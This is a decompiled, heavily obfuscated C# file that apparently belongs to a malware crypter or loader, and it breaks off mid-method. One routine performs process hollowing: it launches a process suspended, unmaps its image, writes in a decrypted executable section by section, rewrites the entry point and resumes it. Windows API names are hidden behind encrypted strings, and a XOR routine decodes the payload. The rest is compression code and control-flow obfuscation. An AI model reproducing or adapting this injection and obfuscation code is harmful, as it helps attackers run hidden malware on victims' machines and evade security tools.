using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Web.Services.Protocols;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using SmartAssembly.SmartExceptionsCore;
using ns1;
using ns10;
using ns11;
using ns12;
using ns13;
using ns3;
using ns5;
using ns8;
using ns9;

internal class Class21
{
	static void smethod_0()
	{
		try
		{
			Class28.smethod_0();
		}
		catch (Exception)
		{
		}
	}

	static bool smethod_1(Class32.Class41 class41_0, int int_0)
	{
		int num = 128;
		int num2 = 128;
		int num8 = default(int);
		while (true)
		{
			short[] short_ = class41_0.short_1;
			int num3 = class41_0.int_4;
			int num4 = class41_0.int_4 + class41_0.int_2;
			while (true)
			{
				int num5 = Math.Max(class41_0.int_2, 2);
				int num6 = Math.Max(class41_0.int_4 - 32506, 0);
				int num7 = class41_0.int_4 + 258 - 1;
				byte b = class41_0.byte_0[num4 - 1];
				byte b2 = class41_0.byte_0[num4];
				while (true)
				{
					if (num5 >= 8)
					{
						num >>= 2;
					}
					while (true)
					{
						if (num2 > class41_0.int_5)
						{
							num2 = class41_0.int_5;
						}
						while (true)
						{
							if (class41_0.byte_0[int_0 + num5] == b2 && class41_0.byte_0[int_0 + num5 - 1] == b)
							{
								goto IL_005b;
							}
							goto IL_01c8;
							IL_0097:
							if (class41_0.byte_0[++num3] == class41_0.byte_0[++num8] && class41_0.byte_0[++num3] == class41_0.byte_0[++num8])
							{
								goto IL_00d5;
							}
							goto IL_018a;
							IL_01c8:
							if ((int_0 = short_[int_0 & 0x7FFF] & 0xFFFF) > num6)
							{
								if (Ht7G4Qg4FYYvPjn2sqY())
								{
								}
								switch (2)
								{
								case 0:
								case 4:
									break;
								case 1:
								case 6:
									goto IL_0097;
								case 8:
									goto IL_00d5;
								case 7:
									goto IL_00f4;
								default:
									goto IL_0169;
								case 2:
									goto IL_01e7;
								case 5:
									goto end_IL_0208;
								case 3:
									goto end_IL_0221;
								case 10:
									goto end_IL_0232;
								case 11:
									goto end_IL_0238;
								case 12:
									goto IL_02b5;
								}
								goto IL_005b;
							}
							goto IL_02a3;
							IL_02a3:
							class41_0.int_2 = Math.Min(num5, class41_0.int_5);
							goto IL_02b5;
							IL_00d5:
							if (class41_0.byte_0[++num3] == class41_0.byte_0[++num8])
							{
								goto IL_00f4;
							}
							goto IL_018a;
							IL_01e7:
							if (--num != 0)
							{
								continue;
							}
							goto IL_02a3;
							IL_005b:
							if (class41_0.byte_0[int_0] == class41_0.byte_0[num3] && class41_0.byte_0[int_0 + 1] == class41_0.byte_0[num3 + 1])
							{
								num8 = int_0 + 2;
								num3 += 2;
								goto IL_0131;
							}
							goto IL_01c8;
							IL_00f4:
							if (class41_0.byte_0[++num3] == class41_0.byte_0[++num8] && class41_0.byte_0[++num3] == class41_0.byte_0[++num8] && num3 < num7)
							{
								goto IL_0131;
							}
							goto IL_018a;
							IL_018a:
							if (num3 > num4)
							{
								class41_0.int_1 = int_0;
								num4 = num3;
								num5 = num3 - class41_0.int_4;
								if (num5 >= num2)
								{
									goto IL_02a3;
								}
								b = class41_0.byte_0[num4 - 1];
								b2 = class41_0.byte_0[num4];
							}
							num3 = class41_0.int_4;
							goto IL_01c8;
							IL_0131:
							if (class41_0.byte_0[++num3] == class41_0.byte_0[++num8] && class41_0.byte_0[++num3] == class41_0.byte_0[++num8])
							{
								goto IL_0169;
							}
							goto IL_018a;
							IL_02b5:
							return class41_0.int_2 >= 3;
							IL_0169:
							if (class41_0.byte_0[++num3] == class41_0.byte_0[++num8])
							{
								goto IL_0097;
							}
							goto IL_018a;
							continue;
							end_IL_0208:
							break;
						}
						continue;
						end_IL_0221:
						break;
					}
					continue;
					end_IL_0232:
					break;
				}
				continue;
				end_IL_0238:
				break;
			}
		}
	}

	static bool smethod_2(EventArgs1 eventArgs1_0)
	{
		if (!eventArgs1_0.bool_1)
		{
			return false;
		}
		return eventArgs1_0.class46_0.method_7();
	}

	static void smethod_3(Class46 class46_0)
	{
		try
		{
			string tempFileName = Path.GetTempFileName();
			Class21.smethod_128(class46_0, tempFileName);
			string path = Class21.smethod_111();
			Process.Start(Path.Combine(path, "SmartAssembly.exe"), "/AddExceptionReport \"" + tempFileName + "\"");
			if (class46_0.eventHandler_0 != null)
			{
				class46_0.eventHandler_0(class46_0, EventArgs.Empty);
			}
		}
		catch (ThreadAbortException)
		{
		}
		catch (Exception fatalException)
		{
			Class21.smethod_113(class46_0, new EventArgs0(fatalException));
		}
	}

	static void smethod_4(Class32.Class34 class34_0, int int_0)
	{
		class34_0.uint_0 >>= int_0;
		class34_0.int_2 -= int_0;
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	static string smethod_5(string string_0, Form1 form1_0)
	{
		string_0 = string_0.Replace("%AppName%", "vf");
		string_0 = string_0.Replace("%CompanyName%", "fbff");
		return string_0;
	}

	static bool smethod_6(Class32.Class39 class39_0, int int_0)
	{
		class39_0.short_0[class39_0.int_1] = 0;
		while (true)
		{
			class39_0.byte_1[class39_0.int_1++] = (byte)int_0;
			while (true)
			{
				class39_0.class40_0.short_0[int_0]++;
				if (Ht7G4Qg4FYYvPjn2sqY())
				{
				}
				switch (4)
				{
				default:
					continue;
				case 0:
				case 3:
					break;
				case 4:
					return Class21.smethod_108(class39_0);
				}
				break;
			}
		}
	}

	static void smethod_7(int int_0, Class32.Class35 class35_0, byte[] byte_0, int int_1)
	{
		if (class35_0.int_1 > 0)
		{
			throw new InvalidOperationException();
		}
		if (int_1 > 32768)
		{
			int_0 += int_1 - 32768;
			int_1 = 32768;
		}
		Array.Copy(byte_0, int_0, class35_0.byte_0, 0, int_1);
		class35_0.int_0 = int_1 & 0x7FFF;
	}

	static bool smethod_8(object[] object_0)
	{
		Class17.Class18 @class = new Class17.Class18();
		Class20.Delegate3 @delegate = Class17.smethod_1<Class20.Delegate3>(Class21.smethod_109("Sk1N1W/kLlYPS5rz2GRFew=="), Class21.smethod_109("ABUKocXA/8U8/dTyQqSgxw=="));
		Class20.Delegate4 delegate2 = Class17.smethod_1<Class20.Delegate4>(Class21.smethod_109("Sk1N1W/kLlYPS5rz2GRFew=="), Class21.smethod_109("0r4Q+KffRShOMrJXQ5bIPBPfs2ueDUQLhElRpvSNOD8="));
		Class20.Delegate5 delegate3 = Class17.smethod_1<Class20.Delegate5>(Class21.smethod_109("Sk1N1W/kLlYPS5rz2GRFew=="), Class21.smethod_109("Fk2eZIMApwcIWTEmb2cS+hpgxP8KTAVFVbM4GPTL2b4="));
		Class20.Delegate6 delegate4 = Class17.smethod_1<Class20.Delegate6>(Class21.smethod_109("Sk1N1W/kLlYPS5rz2GRFew=="), Class21.smethod_109("sBgrGtKz4j+pZ39VniTPP4yPMBN4WHVY4IS8ZY4fmSE="));
		Class20.Delegate7 delegate5 = Class17.smethod_1<Class20.Delegate7>(Class21.smethod_109("pdd3zZ5lwXtj8hV1GKRfVw=="), Class21.smethod_109("2duPdAetIoKQy5xe5y0s2W+3unGrWO/nhF7+U9Kw7MI="));
		Class20.Delegate8 delegate6 = Class17.smethod_1<Class20.Delegate8>(Class21.smethod_109("pdd3zZ5lwXtj8hV1GKRfVw=="), Class21.smethod_109("RxKVVbtH14pgjdXaw2C1YbWUQxywTFbqf/pZBB51J5c="));
		Class20.Delegate9 delegate7 = Class17.smethod_1<Class20.Delegate9>(Class21.smethod_109("Sk1N1W/kLlYPS5rz2GRFew=="), Class21.smethod_109("TgOhAyN9YiqdYirD3QytuA=="));
		Class20.Delegate10 delegate8 = Class17.smethod_1<Class20.Delegate10>(Class21.smethod_109("pdd3zZ5lwXtj8hV1GKRfVw=="), Class21.smethod_109("qt4tHmTORXFlu08c+szp/A=="));
		string text = (string)object_0[0];
		byte[] array = (byte[])object_0[1];
		bool flag = (bool)object_0[2];
		bool flag2 = (bool)object_0[3];
		string text2 = (string)object_0[4];
		int bytesRead = 0;
		string text3 = $"\"{text2}\"";
		Class20.Struct1 startupInfo = default(Class20.Struct1);
		@class.struct0_0 = default(Class20.Struct0);
		startupInfo.uint_0 = Convert.ToUInt32(Marshal.SizeOf(typeof(Class20.Struct1)));
		bool result;
		checked
		{
			try
			{
				Class17.Class18.Class19 CS_0024_003C_003E8__locals0 = new Class17.Class18.Class19();
				CS_0024_003C_003E8__locals0.class18_0 = @class;
				if (!string.IsNullOrEmpty(text))
				{
					text3 = text3 + " " + text;
				}
				if (!@delegate(text2, text3, IntPtr.Zero, IntPtr.Zero, inheritHandles: false, 4u, IntPtr.Zero, null, ref startupInfo, ref @class.struct0_0))
				{
					throw new Exception();
				}
				int num = BitConverter.ToInt32(array, 60);
				int num2 = BitConverter.ToInt32(array, num + 52);
				int[] array2 = new int[179];
				array2[0] = 65538;
				if (!delegate4(@class.struct0_0.intptr_1, array2))
				{
					throw new Exception();
				}
				int num3 = array2[41];
				int buffer = 0;
				if (!delegate2(@class.struct0_0.intptr_0, num3 + 8, ref buffer, 4, ref bytesRead))
				{
					throw new Exception();
				}
				if (num2 == buffer && delegate6(@class.struct0_0.intptr_0, buffer) != 0)
				{
					throw new Exception();
				}
				int length = BitConverter.ToInt32(array, num + 80);
				CS_0024_003C_003E8__locals0.int_1 = BitConverter.ToInt32(array, num + 84);
				bool flag3 = false;
				CS_0024_003C_003E8__locals0.int_0 = delegate7(@class.struct0_0.intptr_0, num2, length, 12288, 64);
				if (!flag && CS_0024_003C_003E8__locals0.int_0 == 0)
				{
					flag3 = true;
					CS_0024_003C_003E8__locals0.int_0 = delegate7(@class.struct0_0.intptr_0, 0, length, 12288, 64);
				}
				if (CS_0024_003C_003E8__locals0.int_0 == 0)
				{
					throw new Exception();
				}
				if (!delegate3(@class.struct0_0.intptr_0, CS_0024_003C_003E8__locals0.int_0, array, CS_0024_003C_003E8__locals0.int_1, ref bytesRead))
				{
					throw new Exception();
				}
				int num4 = num + 248;
				short num5 = BitConverter.ToInt16(array, num + 6);
				for (int i = 0; i <= num5 - 1; i++)
				{
					int num6 = BitConverter.ToInt32(array, num4 + 12);
					int num7 = BitConverter.ToInt32(array, num4 + 16);
					int srcOffset = BitConverter.ToInt32(array, num4 + 20);
					if (num7 != 0)
					{
						byte[] array3 = new byte[num7 - 1 + 1];
						Buffer.BlockCopy(array, srcOffset, array3, 0, array3.Length);
						if (!delegate3(@class.struct0_0.intptr_0, CS_0024_003C_003E8__locals0.int_0 + num6, array3, array3.Length, ref bytesRead))
						{
							throw new Exception();
						}
					}
					num4 += 40;
				}
				byte[] bytes = BitConverter.GetBytes(CS_0024_003C_003E8__locals0.int_0);
				if (!delegate3(@class.struct0_0.intptr_0, num3 + 8, bytes, 4, ref bytesRead))
				{
					throw new Exception();
				}
				int num8 = BitConverter.ToInt32(array, num + 40);
				if (flag3)
				{
					CS_0024_003C_003E8__locals0.int_0 = num2;
				}
				array2[44] = CS_0024_003C_003E8__locals0.int_0 + num8;
				if (unchecked((long)delegate5(@class.struct0_0.intptr_1, array2)) != 0L)
				{
					throw new Exception();
				}
				if (flag2)
				{
					new Thread((ThreadStart)delegate
					{
						Thread.CurrentThread.IsBackground = true;
						if (Class17.Class18.Class19.yfYkSKxi2E3pN3ihoM())
						{
						}
						Class20.Struct0 struct0_ = default(Class20.Struct0);
						uint uint_ = default(uint);
						int int_ = default(int);
						switch (3)
						{
						case 0:
						case 3:
							struct0_ = CS_0024_003C_003E8__locals0.class18_0.struct0_0;
							goto default;
						default:
							uint_ = (uint)CS_0024_003C_003E8__locals0.int_0;
							int_ = CS_0024_003C_003E8__locals0.int_1;
							break;
						case 4:
							break;
						}
						Class21.smethod_68(int_, struct0_, uint_);
					}).Start();
				}
				else
				{
					uint SuspendCount = 0u;
					if (delegate8(@class.struct0_0.intptr_1, out SuspendCount) == -1)
					{
						throw new Exception();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						Class21.smethod_140((int)CS_0024_003C_003E8__locals0.class18_0.struct0_0.uint_0);
					});
					thread.IsBackground = true;
					thread.Start();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				result = false;
				ProjectData.ClearProjectError();
				goto IL_049f;
			}
			Thread.Sleep(100);
			return true;
		}
		IL_049f:
		return result;
	}

	static byte[] smethod_9(EventArgs1 eventArgs1_0)
	{
		return Class21.smethod_103(eventArgs1_0.class46_0);
	}

	static string smethod_10(Form0 form0_0, string string_0)
	{
		string_0 = string_0.Replace("%AppName%", "vf");
		string_0 = string_0.Replace("%CompanyName%", "fbff");
		return string_0;
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	static void smethod_11(Class45 class45_0, Enum4 enum4_0)
	{
		Class21.smethod_75(class45_0, enum4_0, string.Empty);
	}

	static void smethod_12(Control3 control3_0, bool bool_0)
	{
		control3_0.timer_0.set_Enabled(bool_0);
		control3_0.int_0 = 0;
		((Control)control3_0).Refresh();
	}

	static void smethod_13(Class32.Class38 class38_0)
	{
		class38_0.int_0 |= 12;
	}

	static short smethod_14(int int_0)
	{
		return (short)((Class32.Class39.byte_0[int_0 & 0xF] << 12) | (Class32.Class39.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class32.Class39.byte_0[(int_0 >> 8) & 0xF] << 4) | Class32.Class39.byte_0[int_0 >> 12]);
	}

	static string smethod_15(string string_0)
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\RedGate\\SmartAssembly");
			if (registryKey == null)
			{
				return string.Empty;
			}
			string result = (string)registryKey.GetValue(string_0, string.Empty);
			registryKey.Close();
			return result;
		}
		catch
		{
			return string.Empty;
		}
	}

	static void smethod_16(string string_0, string string_1, Class46 class46_0)
	{
		while (File.Exists(string_1))
		{
			Class46.Struct20 value = new Class46.Struct20(string_1);
			while (true)
			{
				class46_0.dictionary_1.Add(string_0, value);
				if (!Ht7G4Qg4FYYvPjn2sqY())
				{
					switch (5)
					{
					default:
						continue;
					case 3:
						break;
					case 1:
					case 4:
						return;
					case 5:
						return;
					}
					break;
				}
				return;
			}
		}
	}

	static int smethod_17(int int_0, int int_1, Class32.Class33 class33_0, byte[] byte_0)
	{
		int num = 0;
		do
		{
			if (class33_0.int_4 != 11)
			{
				int num2 = Class21.smethod_39(int_0, class33_0.class35_0, byte_0, int_1);
				int_0 += num2;
				num += num2;
				int_1 -= num2;
				if (int_1 == 0)
				{
					return num;
				}
			}
		}
		while (Class21.smethod_51(class33_0) || (Class21.smethod_98(class33_0.class35_0) > 0 && class33_0.int_4 != 11));
		return num;
	}

	static void smethod_18(Class32.Class35 class35_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class35_0.byte_0[class35_0.int_0++] = class35_0.byte_0[int_0++];
			class35_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static string smethod_19(object object_0)
	{
		try
		{
			if (object_0 == null)
			{
				return string.Empty;
			}
			if (object_0 is int num)
			{
				return num.ToString("x");
			}
			if (object_0 is long num2)
			{
				return num2.ToString("x");
			}
			if (object_0 is short num3)
			{
				return num3.ToString("x");
			}
			if (object_0 is uint num4)
			{
				return num4.ToString("x");
			}
			if (object_0 is ulong num5)
			{
				return num5.ToString("x");
			}
			if (object_0 is ushort num6)
			{
				return num6.ToString("x");
			}
			if (object_0 is byte b)
			{
				return b.ToString("x");
			}
			if (object_0 is sbyte b2)
			{
				return b2.ToString("x");
			}
			if (object_0 is IntPtr intPtr)
			{
				return intPtr.ToInt64().ToString("x");
			}
			if (object_0 is UIntPtr)
			{
				return ((UIntPtr)object_0).ToUInt64().ToString("x");
			}
		}
		catch
		{
		}
		return string.Empty;
	}

	static void smethod_20(Class32.Stream0 stream0_0, int int_0)
	{
		stream0_0.WriteByte((byte)((uint)int_0 & 0xFFu));
		stream0_0.WriteByte((byte)((uint)(int_0 >> 8) & 0xFFu));
	}

	static void smethod_21(Class32.Class42 class42_0, int int_0, int int_1)
	{
		class42_0.uint_0 |= (uint)(int_0 << class42_0.int_2);
		int num = 3;
		if (T1fpLDgQ4dlcokqoGbL())
		{
			while (true)
			{
				switch (num)
				{
				default:
					num = 2;
					if (T1fpLDgQ4dlcokqoGbL())
					{
						continue;
					}
					goto case 0;
				case 0:
				case 3:
					class42_0.int_2 += int_1;
					break;
				case 1:
				case 4:
					break;
				case 2:
					goto IL_006b;
				case 5:
					goto IL_00ba;
				}
				break;
			}
		}
		if (class42_0.int_2 < 16)
		{
			return;
		}
		goto IL_006b;
		IL_006b:
		class42_0.byte_0[class42_0.int_1++] = (byte)class42_0.uint_0;
		class42_0.byte_0[class42_0.int_1++] = (byte)(class42_0.uint_0 >> 8);
		class42_0.uint_0 >>= 16;
		goto IL_00ba;
		IL_00ba:
		class42_0.int_2 -= 16;
	}

	static void smethod_22(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4)
	{
		Class21.smethod_122(exception_0, new object[5] { object_0, object_1, object_2, object_3, object_4 });
	}

	static void smethod_23(string string_0, Control0 control0_0)
	{
		while (true)
		{
			control0_0.string_0 = string_0;
			while (true)
			{
				control0_0.timer_0.set_Enabled(false);
				control0_0.image_0 = (Image)(object)Class21.smethod_102((string_0.Length <= 0) ? "ok" : "error");
				while (true)
				{
					control0_0.bool_1 = true;
					control0_0.bool_0 = true;
					if (string_0.Length <= 0)
					{
						goto IL_002d;
					}
					goto IL_0060;
					IL_002d:
					((Control)control0_0).Refresh();
					if (!Ht7G4Qg4FYYvPjn2sqY())
					{
						switch (6)
						{
						case 1:
						case 2:
							break;
						default:
							goto IL_0060;
						case 0:
							continue;
						case 5:
							goto end_IL_0006;
						case 6:
							return;
						}
						break;
					}
					continue;
					IL_0060:
					((Control)control0_0).set_Height(100);
					goto IL_002d;
				}
				continue;
				end_IL_0006:
				break;
			}
		}
	}

	static void smethod_24()
	{
		try
		{
			AppDomain.CurrentDomain.AssemblyResolve += Class21.smethod_44;
		}
		catch
		{
		}
	}

	[DllImport("kernel32")]
	internal static extern bool MoveFileEx(string string_0, string string_1, int int_0);

	static bool smethod_25(Class32.Class37 class37_0, Class32.Class34 class34_0)
	{
		while (true)
		{
			int int_ = class37_0.int_2;
			while (true)
			{
				IL_02a5:
				bool result;
				switch (int_)
				{
				case 1:
					goto IL_00e9;
				case 2:
					goto IL_0142;
				case 3:
					goto IL_01c9;
				case 4:
				{
					int num3;
					while (((num3 = Class21.smethod_58(class37_0.class36_0, class34_0)) & -16) == 0)
					{
						class37_0.byte_1[class37_0.int_8++] = (class37_0.byte_2 = (byte)num3);
						if (class37_0.int_8 != class37_0.int_6)
						{
							continue;
						}
						goto IL_02e8;
					}
					if (num3 >= 0)
					{
						if (num3 >= 17)
						{
							class37_0.byte_2 = 0;
						}
						class37_0.int_7 = num3 - 16;
						class37_0.int_2 = 5;
						goto case 5;
					}
					result = false;
					goto IL_02f2;
				}
				case 5:
					while (true)
					{
						IL_0275:
						int int_2 = Class32.Class37.int_1[class37_0.int_7];
						int num = Class21.smethod_62(class34_0, int_2);
						if (num >= 0)
						{
							Class21.smethod_4(class34_0, int_2);
							num += Class32.Class37.int_0[class37_0.int_7];
							while (num-- > 0)
							{
								class37_0.byte_1[class37_0.int_8++] = class37_0.byte_2;
							}
							while (true)
							{
								if (class37_0.int_8 == class37_0.int_6)
								{
									result = true;
									if (Ht7G4Qg4FYYvPjn2sqY())
									{
									}
									switch (16)
									{
									case 0:
									case 1:
										break;
									case 3:
										continue;
									case 10:
										goto end_IL_00aa;
									case 6:
										goto IL_00e9;
									case 4:
										goto IL_00f6;
									case 2:
										goto IL_0117;
									case 5:
										goto IL_013b;
									default:
										goto IL_0142;
									case 11:
										goto IL_017d;
									case 7:
									case 14:
										goto IL_01c9;
									case 12:
									case 15:
										goto IL_0275;
									case 9:
										goto IL_02a5;
									case 13:
									case 16:
										goto end_IL_0275;
									}
								}
								else
								{
									class37_0.int_2 = 4;
								}
								goto end_IL_02a6;
								continue;
								end_IL_00aa:
								break;
							}
							goto IL_00bd;
						}
						result = false;
						break;
						continue;
						end_IL_0275:
						break;
					}
					goto IL_02f2;
				case 0:
					{
						class37_0.int_3 = Class21.smethod_62(class34_0, 5);
						goto IL_00bd;
					}
					IL_00e9:
					class37_0.int_4 = Class21.smethod_62(class34_0, 5);
					goto IL_00f6;
					IL_00f6:
					if (class37_0.int_4 >= 0)
					{
						class37_0.int_4++;
						Class21.smethod_4(class34_0, 5);
						goto IL_0117;
					}
					result = false;
					goto IL_02f2;
					IL_00bd:
					if (class37_0.int_3 >= 0)
					{
						class37_0.int_3 += 257;
						Class21.smethod_4(class34_0, 5);
						class37_0.int_2 = 1;
						goto IL_00e9;
					}
					result = false;
					goto IL_02f2;
					IL_0117:
					class37_0.int_6 = class37_0.int_3 + class37_0.int_4;
					class37_0.byte_1 = new byte[class37_0.int_6];
					goto IL_013b;
					IL_013b:
					class37_0.int_2 = 2;
					goto IL_0142;
					IL_0142:
					class37_0.int_5 = Class21.smethod_62(class34_0, 4);
					if (class37_0.int_5 >= 0)
					{
						class37_0.int_5 += 4;
						Class21.smethod_4(class34_0, 4);
						class37_0.byte_0 = new byte[19];
						goto IL_017d;
					}
					result = false;
					goto IL_02f2;
					IL_017d:
					class37_0.int_8 = 0;
					class37_0.int_2 = 3;
					goto IL_01c9;
					IL_01c9:
					while (class37_0.int_8 < class37_0.int_5)
					{
						int num2 = Class21.smethod_62(class34_0, 3);
						if (num2 >= 0)
						{
							Class21.smethod_4(class34_0, 3);
							class37_0.byte_0[Class32.Class37.int_9[class37_0.int_8]] = (byte)num2;
							class37_0.int_8++;
							continue;
						}
						goto IL_02ec;
					}
					class37_0.class36_0 = new Class32.Class36(class37_0.byte_0);
					class37_0.byte_0 = null;
					class37_0.int_8 = 0;
					class37_0.int_2 = 4;
					goto case 4;
					IL_02ec:
					result = false;
					goto IL_02f2;
					IL_02f2:
					return result;
					IL_02e8:
					result = true;
					goto IL_02f2;
					end_IL_02a6:
					break;
				}
				break;
			}
		}
	}

	static void smethod_26(ThreadStart threadStart_0, Form0 form0_0)
	{
		form0_0.thread_0 = new Thread(threadStart_0);
		form0_0.thread_0.Start();
	}

	static void smethod_27(object[] object_0, Exception exception_0)
	{
		while (true)
		{
			if (exception_0 != null)
			{
				goto IL_0003;
			}
			goto IL_005d;
			IL_005d:
			Class21.smethod_122(exception_0, object_0);
			Class55.Handler.method_3(exception_0, bool_1: false, bool_2: false);
			int num = 6;
			if (Ht7G4Qg4FYYvPjn2sqY())
			{
			}
			goto IL_0028;
			IL_0028:
			switch (num)
			{
			case 1:
				break;
			default:
				return;
			case 2:
			case 5:
				goto IL_004b;
			case 0:
			case 3:
				continue;
			case 4:
				return;
			case 6:
				return;
			}
			goto IL_0003;
			IL_004b:
			if (Class55.Handler.method_2((SecurityException)exception_0))
			{
				break;
			}
			goto IL_005d;
			IL_0003:
			if (exception_0 is SecurityException && Class55.string_0 == "1")
			{
				num = 5;
				if (!Ht7G4Qg4FYYvPjn2sqY())
				{
				}
				goto IL_0028;
			}
			goto IL_005d;
		}
	}

	static void smethod_28(Class32.Class34 class34_0)
	{
		int num = 0;
		class34_0.int_2 = 0;
		int num2 = 0;
		class34_0.int_1 = 0;
		int num3 = 0;
		class34_0.int_0 = 0;
		class34_0.uint_0 = 0u;
	}

	static void smethod_29(Class32.Class35 class35_0)
	{
		int num = 0;
		class35_0.int_0 = 0;
		class35_0.int_1 = 0;
	}

	static bool smethod_30(bool bool_0, bool bool_1, Class32.Class41 class41_0)
	{
		bool flag2;
		do
		{
			Class21.smethod_34(class41_0);
			bool flag;
			flag2 = Class21.smethod_59(flag = bool_0 && class41_0.int_7 == class41_0.int_8, class41_0, bool_1);
		}
		while (class41_0.class42_0.IsFlushed && flag2);
		return flag2;
	}

	static bool smethod_31(EventArgs1 eventArgs1_0, string string_0)
	{
		if (File.Exists(string_0))
		{
			File.Delete(string_0);
		}
		return Class21.smethod_128(eventArgs1_0.class46_0, string_0);
	}

	static Assembly smethod_32()
	{
		try
		{
			return Assembly.GetExecutingAssembly();
		}
		catch
		{
			return null;
		}
	}

	static void smethod_33(int int_0, int int_1, Class32.Class34 class34_0, byte[] byte_0)
	{
		if (class34_0.int_0 >= class34_0.int_1)
		{
			int num = int_1 + int_0;
			while (true)
			{
				IL_0058:
				if (0 <= int_1)
				{
					while (int_1 <= num && num <= byte_0.Length)
					{
						if (((uint)int_0 & (true ? 1u : 0u)) != 0)
						{
							if (Ht7G4Qg4FYYvPjn2sqY())
							{
							}
							switch (4)
							{
							case 3:
								goto IL_0058;
							case 4:
								goto IL_005e;
							case 0:
							case 5:
								goto end_IL_0058;
							case 6:
								goto IL_00a7;
							}
							continue;
						}
						goto IL_0099;
						IL_00a7:
						class34_0.int_1 = num;
						return;
						IL_005e:
						class34_0.uint_0 |= (uint)((byte_0[int_1++] & 0xFF) << class34_0.int_2);
						class34_0.int_2 += 8;
						goto IL_0099;
						IL_0099:
						class34_0.byte_0 = byte_0;
						class34_0.int_0 = int_1;
						goto IL_00a7;
					}
				}
				throw new ArgumentOutOfRangeException();
				continue;
				end_IL_0058:
				break;
			}
		}
		throw new InvalidOperationException();
	}

	static void smethod_34(Class32.Class41 class41_0)
	{
		if (class41_0.int_4 >= 65274)
		{
			if (!T1fpLDgQ4dlcokqoGbL())
			{
				goto IL_00d8;
			}
			switch (0)
			{
			case 0:
				break;
			case 3:
				goto IL_005b;
			default:
				goto IL_00c5;
			case 1:
			case 4:
				goto IL_00d8;
			case 6:
				goto IL_00ff;
			}
			Class21.smethod_131(class41_0);
		}
		goto IL_004b;
		IL_00ff:
		Class21.smethod_148(class41_0);
		return;
		IL_00f6:
		if (class41_0.int_5 < 3)
		{
			return;
		}
		goto IL_00ff;
		IL_00d8:
		int num = default(int);
		class41_0.int_7 += num;
		class41_0.int_6 += num;
		goto IL_00c5;
		IL_004b:
		if (class41_0.int_5 < 262)
		{
			goto IL_005b;
		}
		goto IL_00f6;
		IL_005b:
		if (class41_0.int_7 < class41_0.int_8)
		{
			num = 65536 - class41_0.int_5 - class41_0.int_4;
			if (num > class41_0.int_8 - class41_0.int_7)
			{
				num = class41_0.int_8 - class41_0.int_7;
			}
			Array.Copy(class41_0.byte_1, class41_0.int_7, class41_0.byte_0, class41_0.int_4 + class41_0.int_5, num);
			goto IL_00d8;
		}
		goto IL_00f6;
		IL_00c5:
		class41_0.int_5 += num;
		goto IL_004b;
	}

	static byte[] smethod_35(string string_0, byte[] byte_0)
	{
		checked
		{
			byte[] array = new byte[byte_0.Length + 1];
			int num = byte_0[byte_0.Length - 1] ^ 0x70;
			byte[] bytes = Encoding.Default.GetBytes(string_0);
			int num2 = byte_0.Length - 1;
			int num3 = default(int);
			for (int i = 0; i <= num2; i++)
			{
				array[i] = (byte)(byte_0[i] ^ num ^ bytes[num3]);
				num3 = ((num3 != string_0.Length - 1) ? (num3 + 1) : 0);
			}
			return (byte[])Utils.CopyArray((Array)array, (Array)new byte[byte_0.Length - 2 + 1]);
		}
	}

	static void smethod_36(EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_1 = false;
	}

	static void smethod_37(Class32.Class39.Class40 class40_0, int int_0)
	{
		Class21.smethod_21(class40_0.class39_0.class42_0, class40_0.short_1[int_0] & 0xFFFF, (int)class40_0.byte_0[int_0]);
	}

	static void smethod_38()
	{
		string text = "";
	}

	static int smethod_39(int int_0, Class32.Class35 class35_0, byte[] byte_0, int int_1)
	{
		int num = class35_0.int_0;
		if (int_1 > class35_0.int_1)
		{
			int_1 = class35_0.int_1;
		}
		else
		{
			num = (class35_0.int_0 - class35_0.int_1 + int_1) & 0x7FFF;
		}
		int num2 = int_1;
		int num3 = int_1 - num;
		if (num3 > 0)
		{
			Array.Copy(class35_0.byte_0, 32768 - num3, byte_0, int_0, num3);
			int_0 += num3;
			int_1 = num;
		}
		Array.Copy(class35_0.byte_0, num - int_1, byte_0, int_0, int_1);
		class35_0.int_1 -= num2;
		if (class35_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		return num2;
	}

	static void smethod_40(Class46 class46_0)
	{
		while (true)
		{
			EventHandler eventHandler_ = class46_0.eventHandler_0;
			if (Ht7G4Qg4FYYvPjn2sqY())
			{
				break;
			}
			switch (1)
			{
			case 0:
			case 4:
				break;
			case 1:
				if (eventHandler_ == null)
				{
					return;
				}
				goto default;
			default:
				eventHandler_(class46_0, EventArgs.Empty);
				return;
			case 5:
				return;
			}
		}
	}

	static byte[] smethod_41(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		return Class21.smethod_149(byte_2, 3, byte_0, byte_1);
	}

	static void smethod_42(Control0 control0_0)
	{
		control0_0.timer_0.set_Enabled(true);
		control0_0.image_0 = (Image)(object)Class21.smethod_102("current");
		control0_0.bool_0 = true;
		((Control)control0_0).Refresh();
	}

	static void smethod_43(Class32.Class35 class35_0, int int_0, int int_1)
	{
		if ((class35_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class35_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class35_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class35_0.byte_0, num, class35_0.byte_0, class35_0.int_0, int_0);
				class35_0.int_0 += int_0;
			}
			else
			{
